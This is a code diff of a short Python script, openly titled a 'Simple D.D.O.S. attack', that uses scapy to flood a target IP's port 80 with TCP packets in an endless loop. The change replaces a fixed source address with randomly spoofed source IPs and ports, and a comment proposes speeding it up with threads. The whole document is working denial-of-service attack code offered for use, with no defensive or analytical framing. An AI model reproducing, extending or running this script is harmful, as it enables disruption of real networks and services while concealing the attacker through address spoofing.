@@ -1,21 +1,28 @@
 #!/usr/bin/python3
 from scapy.all import *
 import argparse
+from random import randint
 
 parser = argparse.ArgumentParser(description="Simple D.D.O.S. attack")  #Distributed Denial Of Service
-parser.add_argument("-s", "--source", dest="source", help="Source IP", required=True)
 parser.add_argument("-t", "--target", dest="target", help="Target IP", required=True)
 arguments = parser.parse_args()
 
 packages = 1
 
+def randomIP():
+    part1 = str(randint(1,254))
+    part2 = str(randint(1,254))
+    part3 = str(randint(1,254))
+    part4 = str(randint(1,254))
+    dot = "."
+    return(part1+dot+part2+dot+part3+dot+part4)
+
 while True:
-    for port in range(1000, 65535):
-        IP1 = IP(src=arguments.source, dst=arguments.target)
-        TCP1 = TCP(sport=port, dport=80)
-        package = IP1 / TCP1
-        send(package, inter=0.001, verbose=False)   #inter: time interval to wait between two packages
-        print("Number of packages: ", packages)
-        packages += 1
+    IP1 = IP(src=randomIP(), dst=arguments.target)
+    TCP1 = TCP(sport=randint(1, 65534), dport=80)
+    package = IP1 / TCP1
+    send(package, inter=0.001, verbose=False)   #inter: time interval to wait between two packages
+    print("Ip: %s  -----------  Port: %i" %(IP1.src, TCP1.sport))
+    packages += 1
 
 #TODO: optimize with threads
